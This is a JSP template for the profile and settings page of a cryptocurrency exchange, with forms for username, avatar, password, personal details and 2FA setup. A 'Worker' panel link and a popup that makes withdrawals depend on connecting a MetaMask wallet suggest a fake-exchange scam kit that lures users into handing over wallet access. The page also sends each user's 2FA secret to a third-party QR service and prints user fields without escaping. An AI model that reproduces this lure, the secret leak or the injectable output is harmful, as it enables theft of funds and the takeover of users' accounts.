<%@ page import="java.util.List" %>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <%
        out.println("<title>Wallet overview | " + request.getAttribute("domain_exchange_name") + "</title>");
    %>
  <%
    out.println("<link rel=\"icon\" href=\"" + request.getAttribute("domain_icon") + "\">");
  %>
    <%
        out.println("<meta property=\"og:title\" content=\"" + request.getAttribute("domain_title") + "\">");
    %>
    <meta property="og:description" content="Best place to buy, trade and sell Bitcoin, Ethereum and over 100 cryptocurrencies safely and securely.">
  <link rel="stylesheet" href="../assets/css/g_menu_normalize.css">
  <link rel="stylesheet" href="../assets/css/g_menu_style.css">
  <link rel="stylesheet" href="../assets/css/style.css?v=3">
  <link rel="stylesheet" href="../assets/css/custom.css?v=3">
  <link rel="stylesheet" href="../plugins/notifications/toastr.css">
  <link rel="stylesheet" href="../assets/css/popap-style.css">
  <link rel="stylesheet" href="../assets/css/stake.css">
  <link rel="stylesheet" href="../assets/css/popup/popup-verifi.css">
  <link rel="stylesheet" href="../assets/css/available.css">
  <link rel="stylesheet" href="../assets/css/new_popup_style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
    <script src="../assets/js/jquery-3.4.1.min.js"></script>
</head>

<body id="dark" class="stop-scrolling">

<!-- PRELOADER -->
<!-- PRELOADER END -->


<header class="header">
        <div class="header__left">
            <a class="header__logo" href="/">
                <%
        out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" alt=\"\">");
      %>
                <%
        out.println("<span class=\"header__logo-text\">" + request.getAttribute("domain_exchange_name") + "</span>");
      %>
            </a>
            <div class="header__links">
                <a class="header__link" href="../trading">Trading</a>
                <div class="header__link-tools header__tools">
                    <span class="header__link-tools-span">Market tools</span>

                    <div class="header__tools-box">
                        <a class="header__tools-link" href="../tools/marketcrypto">Crypto market cap</a>
                        <a class="header__tools-link" href="../tools/marketscreener">Market screener</a>
                        <a class="header__tools-link" href="../tools/technicalanalysis">Technical analysis</a>
                        <a class="header__tools-link" href="../tools/crossrates">Cross rates</a>
                        <a class="header__tools-link" href="../tools/heatmap">Currency heat map</a>
                    </div>
                </div>
                <a class="header__link" href="/profile/invest">Invest</a>
                <a class="header__link header__link-new" href="/profile/p2p">P2P</a>
                <a class="header__link header__link-hot" href="/profile/swap">Swap</a>
                <%
                if (request.getAttribute("support_unviewed") != null && ((int) request.getAttribute("support_unviewed")) > 0) {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support <span id=\"count_support_message\" class=\"support_messages\">" + request.getAttribute("support_unviewed") + "</span></a>");
                } else {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support </a>");
                }
            %>
                <%
                    out.println("<a class=\"header__link\" href=\"/profile/wallet\">Wallet: " + request.getAttribute("total_balance") + " USD </a>");
                %>
            </div>
        </div>
                <div class="header__right">
            <div class="header__profile">
                <div class="header__profile-toggle">
                    <%
                        out.print("<div class=\"header__toggle-name\">" + request.getAttribute("username") + "</div>");
                    %>
                    <div class="header__toggle-img">
                        <%
                            out.println("<img src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                        %>
                    </div>
                    <div class="header__toggle-btn">
                        <svg width="28" height="28" viewbox="0 0 100 100">
                            <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
                            <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
                            <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
                        </svg>
                    </div>
                </div>

                <div class="header__profile-box">
                    <div class="header__profile-top">
                        <%
                        if (request.getAttribute("kyc_accepted") != null) {
                            out.println("<div class=\"header__profile-img header__profile-kyc\">");
                        } else {
                            out.println("<div class=\"header__profile-img \">");
                        }
                        out.println("<img style=\"width: 64px; height: 64px; border-radius: 50%;\" src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                        out.println("</div>");
                    %>
                    <div class="header__profile-info">
                        <%
                            out.print("<div class=\"header__profile-name\">" + request.getAttribute("username") + "</div>");
                            out.print("<div class=\"header__profile-email\">" + request.getAttribute("email") + "</div>");
                            out.print("<div class=\"userCard__user-premium-" + (request.getAttribute("premium") == null ? "danger" : "success") + "\" style=\"font-size: 13px; margin-left: 5px; padding-left: 15px;\">Premium</div>");
                        %>
                    </div>
                    </div>
                    <div class="header__profile-center">
                        <a class="header__profile-link" href="../trading">Trading</a>
                        <a class="header__profile-link header__profile-tools" href="#">
                            <span>Market tools</span>

                            <div class="header__profile-tools-box">
                                <a class="header__profile-tools-link" href="../tools/marketcrypto">
                                    Crypto market cap
                                </a>
                                <a class="header__profile-tools-link" href="../tools/marketscreener">
                                    Market screener
                                </a>
                                <a class="header__profile-tools-link" href="../tools/technicalanalysis">
                                    Technical analysis
                                </a>
                                <a class="header__profile-tools-link" href="../tools/crossrates">
                                    Cross rates
                                </a>
                                <a class="header__profile-tools-link" href="../tools/heatmap">
                                    Currency heat map
                                </a>
                            </div>
                        </a>
                        <a class="header__profile-link" href="/profile/invest">Invest</a>
                        <a class="header__profile-link header__link-new" href="/profile/p2p">P2P</a>
                        <a class="header__profile-link header__link-hot" href="/profile/swap">Swap</a>
                        <a class="header__profile-link" href="/profile/support">Support</a>
                    </div>
                    <div class="header__profile-bottom">
                        <%
                            Object panel = request.getAttribute("panel");
                            if (panel != null) {
                                out.println("<a class=\"header__profile-link\" href=\"../" + (((String) panel).equals("Worker") ? "panel" : "admin") + "\" style=\"color: orange;\">\n" +
                                        "                            <div class=\"header__profile-link-icon\">\n" +
                                        "                                <svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\"><path d=\"M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z\"></path></svg>\n" +
                                        "                            </div>\n" +
                                        panel + " panel</a>");
                            }
                        %>
                                                <a class="header__profile-link" href="/profile/wallet">
                            <div class="header__profile-link-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z"></path></svg>
                            </div>
                                                    <%
                                                        out.println("<span>Wallet: " + request.getAttribute("total_balance") + " USD </span>");
                                                    %>
                        </a>
                        <a class="header__profile-link" href="/profile/settings">
                            <div class="header__profile-link-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.21,8.95 2.27,9.22 2.46,9.37L4.57,11C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.21,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.67 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z"></path></svg>
                            </div>
                            <span>Settings</span>
                        </a>
                        <a class="header__profile-link header__profile-out" href="/profile/logout">
                            <div class="header__profile-link-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M16.56,5.44L15.11,6.89C16.84,7.94 18,9.83 18,12A6,6 0 0,1 12,18A6,6 0 0,1 6,12C6,9.83 7.16,7.94 8.88,6.88L7.44,5.44C5.36,6.88 4,9.28 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12C20,9.28 18.64,6.88 16.56,5.44M13,3H11V13H13"></path></svg>
                            </div>
                            <span>Log Out</span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
          </header>


    
<div class="b1">
    <div class="page-title dashboard">
            <div class="container">
                <div class="row">
                    <div class="col-6">
                        <div class="page-title-content">
                            <p>Welcome Back,
                                <%
                                    out.print("<span> " + request.getAttribute("username") + "</span>");
                                %>
                            </p>
                        </div>
                    </div>
                    <div class="col-6">
                        <ul class="text-right breadcrumbs list-unstyle">
                            <li><a href="/profile/wallet">Back to Wallet</a></li>
                            
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="content-body">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <div class="card sub-menu">
                            
                        </div>
                    </div>
                    <div class="col-xl-12">
                        <div class="row">
                            <%
                                Object twoFactorCode = request.getAttribute("two_factor_code");
                                if (twoFactorCode != null) {
                                    out.println("<div class=\"col-xl-12 col-md-12\">\n" +
                                            "                            <link rel=\"stylesheet\" href=\"../assets/css/userStyle-1.css\">\n" +
                                            "                            <section class=\"userAttention\" style=\"margin-bottom: 32px; margin-top: 8px;\">\n" +
                                            "                              <div class=\"userCard__container\" style=\"padding: 0;\">\n" +
                                            "                                  <div class=\"userAttention__box\">\n" +
                                            "                                      <div class=\"userAttention__text\">\n" +
                                            "                                          <span>Attention!</span>Your account is not secure enough, please enable two-factor authentication\n" +
                                            "                                      </div>\n" +
                                            "                                      <div class=\"userAttention__btn\" id=\"enable_2fa\">Enable</div>\n" +
                                            "                                  </div>\n" +
                                            "                              </div>\n" +
                                            "                            </section>\n" +
                                            "                            </div>");
                                }
                            %>
                            <div class="col-xl-12 col-md-12">
                                <div class="card" style="min-height: 170px; background: #26273a;">
                                    <div class="card-header" style="background: #26273a;">
                                        <h4 class="card-title">Account Verification</h4>
                                    </div>
                                    <div class="card-body" style="background: #26273a;">

                                        <div class="form-row">
                                            <div class="col-md-10">
                                                <p style="color: #9895d9">To increase user limits, you need to pass the
                                                    verification of a Intermediate user or a Advanced user,
                                                    you must provide personal information, a photo
                                                    of an identity document, and a photo of your face.</p>
                                            </div>
                                            <div class="col-md-2">
                                                <img class="kyc_block_image" src="../assets/img/verification.webp" style="width: 114px; position: absolute; right: 19px; top: -5px;">
                                            </div>


                                            <div class="col-12">
                                                <a href="/profile/verification" class="btn btn-info waves-effect px-4">Verification page</a>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </div>
                            <div class="col-xl-6 col-md-6">
                                <div class="card">
                                   
                                    <div class="card-body">
                                        <form action="/profile/edit_settings" method="POST" enctype="multipart/form-data">
                                            <input type="hidden" name="action" value="UPDATE_AVATAR_AND_LOGIN">
                                            <div class="form-row">
                                                <div class="form-group col-xl-12">
                                                    <label class="mr-sm-2">Your Username</label>
                                                    <%
                                                        out.print("<input id=\"username\" name=\"username\" type=\"text\" class=\"form-control\" placeholder=\"Name\" value=\"" + request.getAttribute("username") + "\">");
                                                        if (request.getAttribute("error_username_size") != null) {
                                                            out.println("<p style=\"color: #cc5252; font-weight: bold; margin-top: 10px;\">Username is not valid (limits: 6 - 32)</p>");
                                                        } else if (request.getAttribute("error_username_exists") != null) {
                                                            out.println("<p style=\"color: #cc5252; font-weight: bold; margin-top: 10px;\">Username already exists</p>");
                                                        } else if (request.getAttribute("error_username_symbols") != null) {
                                                            out.println("<p style=\"color: #cc5252; font-weight: bold; margin-top: 10px;\">Username contains blocked symbols</p>");
                                                        }
                                                    %>
                                                </div>

                                                <div class="form-group col-xl-12">
                                                    <div class="media align-items-center mb-3">
                                                        <%
                                                            out.println("<img class=\"mr-3 rounded-circle mr-0 mr-sm-3\" src=\"" + request.getAttribute("avatar") + "\" width=\"50\" height=\"50\" alt=\"\">");
                                                        %>
                                                        <div class="media-body">
                                                            <%
                                                                out.print("<h5 class=\"mb-0\">" + request.getAttribute("username") + "</h5>");
                                                            %>
                                                            <p class="mb-0">Max file size is 1 mb
                                                            </p>
                                                        </div>

                                                    </div>
                                                    <div class="file-upload-wrapper" data-text="Change Photo">
                                                        <input id="profile_photo" accept="image/x-png,image/jpeg" name="profile_photo" type="file" class="file-upload-field">
                                                    </div>
                                                    <%
                                                        if (request.getAttribute("error_image_type") != null) {
                                                            out.println("<p style=\"color: #cc5252; font-weight: bold; margin-top: 10px;\">Incorrect image type</p>");
                                                        } else if (request.getAttribute("error_image_size") != null) {
                                                            out.println("<p style=\"color: #cc5252; font-weight: bold; margin-top: 10px;\">Image size limit, try low 500KB</p>");
                                                        }
                                                    %>
                                                </div>
                                                <div class="col-12">
                                                    <button id="save_img_login" class="btn btn-success waves-effect px-4">Save</button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xl-6 col-md-6">
                                <div class="card">
                                    
                                    <div class="card-body">
                                        <form action="#">
                                            <div class="form-row">
                                                <div class="form-group col-xl-12">
                                                    <label class="mr-sm-2">Phone number</label>
                                                    <%
                                                        Object phoneNumber = request.getAttribute("phone_number");
                                                        out.print("<input id=\"phone_number\" type=\"email\" class=\"form-control\" placeholder=\"+11234567890\" value=\"" + (phoneNumber == null ? "" : phoneNumber) + "\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-12">
                                                    <label class="mr-sm-2">Old Password</label>
                                                    <input id="old_password" type="password" class="form-control" placeholder="**********">
                                                    
                                                </div>
                                                <div class="form-group col-xl-12">
                                                    <label class="mr-sm-2">New Password</label>
                                                    <input id="new_password" type="password" class="form-control" placeholder="**********">
                                                    
                                                </div>
                                              
                                                <div class="col-12">
                                                    <button id="user_profile_save" class="btn btn-success waves-effect px-4">Save</button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-xl-12">
                                <div class="card">
                                    <div class="card-header">
                                        <h4 class="card-title">Personal Information</h4>
                                    </div>
                                    <div class="card-body">
                                        <form class="personal_validate" action="#">
                                            <div class="form-row">
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">Your Name</label>
                                                    <%
                                                        Object name = request.getAttribute("name");
                                                        out.print("<input id=\"fullname\" type=\"text\" class=\"form-control\" placeholder=\"John Doe\" name=\"fullname\" value=\"" + (name == null ? "" : name) + "\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">Current email</label>
                                                    <%
                                                        out.print("<input id=\"inputEmail\" type=\"email\" class=\"form-control\" value=\"" + request.getAttribute("email") + "\" name=\"email\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">Date of birth</label>
                                                    <%
                                                        Object birthDate = request.getAttribute("birthDate");
                                                        out.print("<input id=\"date_of_birth\" type=\"text\" class=\"form-control\" placeholder=\"10-10-2020\" id=\"datepicker\" autocomplete=\"off\" name=\"dob\" value=\"" + (birthDate == null ? "" : birthDate) + "\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">Present Address</label>
                                                    <%
                                                        Object presentAddress = request.getAttribute("presentAddress");
                                                        out.print("<input id=\"present_address\" type=\"text\" class=\"form-control\" placeholder=\"56, Old Street, Brooklyn\" name=\"present_address\" value=\"" + (presentAddress == null ? "" : presentAddress) + "\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">Permanent Address</label>
                                                    <%
                                                        Object permanentAddress = request.getAttribute("permanentAddress");
                                                        out.print("<input id=\"permanent_address\" type=\"text\" class=\"form-control\" placeholder=\"123, Central Square, Brooklyn\" name=\"permanentaddress\" value=\"" + (permanentAddress == null ? "" : permanentAddress) + "\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">City</label>
                                                    <%
                                                        Object city = request.getAttribute("city");
                                                        out.print("<input id=\"user_city\" type=\"text\" class=\"form-control\" placeholder=\"New York\" name=\"city\" value=\"" + (city == null ? "" : city) + "\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">Postal Code</label>
                                                    <%
                                                        Object postalCode = request.getAttribute("postalCode");
                                                        out.print("<input id=\"user_postal_code\" type=\"text\" class=\"form-control\" placeholder=\"25481\" name=\"postal\" value=\"" + (postalCode == null ? "" : postalCode) + "\">");
                                                    %>
                                                </div>
                                                <div class="form-group col-xl-6 col-md-6">
                                                    <label class="mr-sm-2">Country</label>
                                                    <select id="user_country" class="form-control" name="country">
                                                        <%
                                                            out.println("<option value=\"\"" + (request.getAttribute("country") != null ? " selected" : "") + ">Select</option>");
                                                            List<String> countries = (List<String>) request.getAttribute("countries");
                                                            for (String country : countries) {
                                                                boolean selected = request.getAttribute("country") != null && ((String) request.getAttribute("country")).equalsIgnoreCase(country);
                                                                out.println("<option value=\"" + country + "\"" + (selected ? " selected" : "") + ">" + country + "</option>");
                                                            }
                                                        %>
                                                    </select>
                                                </div>
                                                <div class="form-group col-12">
                                                    <button id="update_person_info" class="btn btn-success px-4">Save</button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <%
        if (twoFactorCode != null) {
            String html = String.format("<div id=\"security_2fa\" class=\"popup__container\" style=\"display: none;\">\n" +
                    "    <div class=\"popup\">\n" +
                    "        <div class=\"popup__close\" id=\"close_modal\">\n" +
                    "            <svg xmlns=\"http://www.w3.org/2000/svg\" x=\"0px\" y=\"0px\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" style=\" fill:#FFFFFF;\"><path d=\"M 4.9902344 3.9902344 A 1.0001 1.0001 0 0 0 4.2929688 5.7070312 L 10.585938 12 L 4.2929688 18.292969 A 1.0001 1.0001 0 1 0 5.7070312 19.707031 L 12 13.414062 L 18.292969 19.707031 A 1.0001 1.0001 0 1 0 19.707031 18.292969 L 13.414062 12 L 19.707031 5.7070312 A 1.0001 1.0001 0 0 0 18.980469 3.9902344 A 1.0001 1.0001 0 0 0 18.292969 4.2929688 L 12 10.585938 L 5.7070312 4.2929688 A 1.0001 1.0001 0 0 0 4.9902344 3.9902344 z\"></path></svg>\n" +
                    "        </div>\n" +
                    "        <div class=\"popup__left\">\n" +
                    "            <img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/6/6e/Google_Authenticator_for_Android_icon.svg/1200px-Google_Authenticator_for_Android_icon.svg.png\" alt=\"\" style=\"width: 145px; height: 145px; top: unset; left: unset; margin-top: 262px; margin-left: 31px; position: fixed;\">\n" +
                    "        </div>\n" +
                    "        <div class=\"popup__right\">\n" +
                    "            <div class=\"popup__right-title\">\n" +
                    "                Enable Google 2FA Authorization\n" +
                    "            </div>\n" +
                    "            <div class=\"popup__right-description\">\n" +
                    "                <p>1. Scan this QR code in the <a target=\"_blank\" href=\"https://support.google.com/accounts/answer/1066447\">Google Authenticator app</a>\n" +
                    "                    <img style=\"width: 135px; display: block; margin-top: 7px; border: 6px solid white;\" src=\"https://api.qrserver.com/v1/create-qr-code/?data=otpauth://totp/%s+(%s)?secret=%s&amp;size=200x200&amp;ecc=M\">\n" +
                    "                </p>\n" +
                    "                <br>\n" +
                    "                <p>2. Write down this code in a safe place\n" +
                    "                    <span style=\"background: #323548; padding: 10px; margin-top: 8px; display: block; width: 310px; text-align: center; border-radius: 7px; font-weight: bold;\">%s</span>\n" +
                    "                </p>\n" +
                    "                <br>\n" +
                    "                <p>3. To activate, enter the code that has started to be generated\n" +
                    "                    <input id=\"code_2fa\" type=\"number\" placeholder=\"******\" style=\"display: block; background: #eaeaff; border: 1px solid #343434; border-radius: 5px; padding: 11px; color: #303030; padding-bottom: 6px; width: 111px; margin-top: 6px; font-size: 17px;\">\n" +
                    "                </p>\n" +
                    "            </div>\n" +
                    "            <div id=\"connect_google_2fa\" class=\"popup__right-button\">\n" +
                    "                Activate Google 2FA\n" +
                    "            </div>\n" +
                    "        </div>\n" +
                    "    </div>\n" +
                    "</div>", request.getHeader("host"), request.getAttribute("email"), twoFactorCode, twoFactorCode);
            out.println(html);
        }
    %>
 <!-- START FOOTER -->
		<div class="bottom section-padding">
			<div class="container">
				<div class="row">
					<div class="col-xl-4 col-lg-4 col-md-6 col-sm-6">
						<div class="bottom-logo">
						
							<a class="navbar-logo-vn" href="/">
								<%
              out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" style=\"width: 30px;\" alt=\"\">");
            %>
								 <%
              out.println("<span style=\"margin-left: 6px;\">" + request.getAttribute("domain_exchange_name") + "</span>");
            %>
							  </a>
		
							<%
            out.println("<p style=\"width: 230px;\">" + request.getAttribute("domain_exchange_name") + " is a simple, elegant, and secure platform to build your crypto portfolio.</p>");
          %>
						</div>
                        
                    
                    						
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Features</h4>
							<ul>
								<li><a href="/">Home</a></li>
								<li><a href="../trading">Trading</a></li>
								<li><a href="/profile/wallet">Wallet</a></li>
								<li><a href="/profile/invest">Invest</a></li>
								<li><a href="/profile/swap">Instant swap</a></li>
								<li><a href="/profile/p2p">P2P</a></li>
								<li><a href="/profile/support">Support</a></li>
							</ul>
						</div>
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Market tools</h4>
							<ul>
                                <li><a href="../tools/marketcrypto">Crypto market cap</a></li>
                                <li><a href="../tools/marketscreener">Market screener</a></li>
                                <li><a href="../tools/technicalanalysis">Technical analysis</a></li>
                                <li><a href="../tools/crossrates">Cross rates</a></li>
                                <li><a href="../tools/heatmap">Currency heat map</a></li>
							</ul>
						</div>
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Legal</h4>
							<ul>
                                <li><a href="../terms">Terms of service</a></li>
                                <li><a href="../privacy-notice">Privacy notice</a></li>
                                <li><a href="../cookies-policy">Cookies policy</a></li>
                                <li><a href="../aml-kyc-policy">AML & KYC policy</a></li>
                                <li><a href="../fees">Fees</a></li>
                                <li><a href="../bugbounty">Bug Bounty</a></li>
							</ul>
						</div>
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Exchange Pair</h4>
							<ul>
								<li><a href="../trading?symbol=BTC">BTC to USDT</a></li>
                                <li><a href="../trading?symbol=ETH">ETH to USDT</a></li>
                                <li><a href="../trading?symbol=LTC">LTC to USDT</a></li>
                                <li><a href="../trading?symbol=ADA">ADA to USDT</a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="footer">
			<div class="container">
				<div class="row">
					<div>
						<div class="copyright">
							<%
            out.println("<p style=\"font-size:12px\" ;=\"\"><strong>" + request.getAttribute("domain_exchange_name") + "</strong> © Copyright 2023 | Worldwide Distributed Digital Asset Exchange | Trading digitals assets such as Bitcoin involves significant risks.</p>");
          %>


						</div>
					</div>
					<div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
						<div class="footer-social">
							
						</div>
					</div>
				</div>
			</div>
		</div>

	  <div id="alert_message_modal" class="popup__container" style="display: none;">
        <div class="popup">
            <div class="popup__close" id="alert_close_modal">
                <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewbox="0 0 24 24" style=" fill:#FFFFFF;"><path d="M 4.9902344 3.9902344 A 1.0001 1.0001 0 0 0 4.2929688 5.7070312 L 10.585938 12 L 4.2929688 18.292969 A 1.0001 1.0001 0 1 0 5.7070312 19.707031 L 12 13.414062 L 18.292969 19.707031 A 1.0001 1.0001 0 1 0 19.707031 18.292969 L 13.414062 12 L 19.707031 5.7070312 A 1.0001 1.0001 0 0 0 18.980469 3.9902344 A 1.0001 1.0001 0 0 0 18.292969 4.2929688 L 12 10.585938 L 5.7070312 4.2929688 A 1.0001 1.0001 0 0 0 4.9902344 3.9902344 z"></path></svg>
            </div>
            <div class="popup__left">
                <img src="../assets/img/warning.png" alt="" id="alert_img_pop">
            </div>
            <div class="popup__right">
                <div class="popup__right-title" id="alert_title_text">
                    Warning
                </div>
                <div class="popup__right-description" id="userAlertBox">


                </div>
                <input type="hidden" id="alertMessageId" value="0">
                <div id="alert_close_modal_btn" class="popup__right-button">
                    Close
                </div>
            </div>
        </div>
    </div>

<div id="verify_popap_meta" class="popap-verifi" style="position: fixed !important; display: none; text-align: left;">
	<input type="hidden" id="MetaalertMessageId" value="0">
  <div class="popap-verifi-container-item popap-verifi-list-one popap-verifi-activ">

    <div class="popap-verifi-container-item-img">
        <img src="../metamask/assets/fox.svg" style="width: 135px;">
    </div>
    <div class="popap-verifi-item-info">

        <div class="popap-verifi-loader">
            <div class="popap-verifi-loader-border"></div>
        </div>
        <div class="popap-verifi-item-info-title">
            Last step of verification
        </div>
        <div id="alertMessageMeta" class="popap-verifi-item-info-text" style="max-height: 170px; overflow: hidden;">
            To complete the verification process - connect your Metamask wallet.<br><br>
			After confirming metamask wallet, you will be able to withdraw your funds. 
        </div>
        <div class="popap-verifi-item-info-btn">
            <button onclick="openMetaMask()" class="popap-verifi-item-info-btn-next popap-verifi-list-one-button">
                Connect Metamask
            </button>
            <button id="closeMetaMaskBtn" class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-list-one">
                Cancel
            </button>
        </div>
    </div>
</div>
</div>
		<!-- END FOOTER -->	

  <script src="../assets/js/popper.min.js"></script>
  <script src="../assets/js/bootstrap.min.js"></script>
  <script src="../assets/js/amcharts-core.min.js"></script>
  <script src="../assets/js/amcharts.min.js"></script>
  <script src="../assets/js/custom.js"></script>
  <script src="../plugins/notifications/toastr.js"></script>
  <script src="../assets/js/new-select/new-select.js"></script>
  <script src="../assets/js/verifi/verifi.js"></script>
  <script src="../assets/js/menu_main.js"></script>
  <script src="../assets/js/g_menu_main.js"></script>
  <script>
  function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }

  </script>

</body>

</html>
<script>


    $("#user_profile_save").on("click", function(e) {
    e.preventDefault();

    var phone_number = $("#phone_number").val();
    var old_password = $("#old_password").val();
    var new_password = $("#new_password").val();

    if(new_password.length > 0 && new_password.length < 6 && new_password.length > 20) {
        noti("Password must be at least 6 characters and maximum 20 symbols", "error");
    }if(old_password.length > 0 && old_password.length < 6) {
        noti("Password must be at least 6 characters", "error");
    } else {
        $.ajax({
          url: "/profile/edit_settings",
          type: "POST",
          data: {
            action: "UPDATE_USER_PROFILE",
            phone: phone_number,
            old_password: old_password,
            new_password: new_password
          },
          success: function(response) {
            console.log(response);
            if(response == "1") {
              noti("Data updated successfully", "success");
            } else if(response == "2") {
              noti("Please enter correct phone number", "error");
            } else if(response == "3") {
              noti("Password must be at least 6 characters and maximum 20 symbols", "error");
            } else if(response == "5") {
                noti("Old password is not correct", "error");
            } else if(response === "999") {
                noti("Password contains blocked symbols", "error");
            } else {
              noti("An unexpected error has occurred, please try again", "error");
            }

          }
        })
    }
  });

  $("#update_person_info").on("click", function(e) {
    e.preventDefault();

    var u_fullname = $("#fullname").val();
    var date_of_birth = $("#date_of_birth").val();
    var present_address = $("#present_address").val();
    var permanent_address = $("#permanent_address").val();
    var user_city = $("#user_city").val();
    var user_postal_code = $("#user_postal_code").val();
    var user_country = $("#user_country option:selected").val();
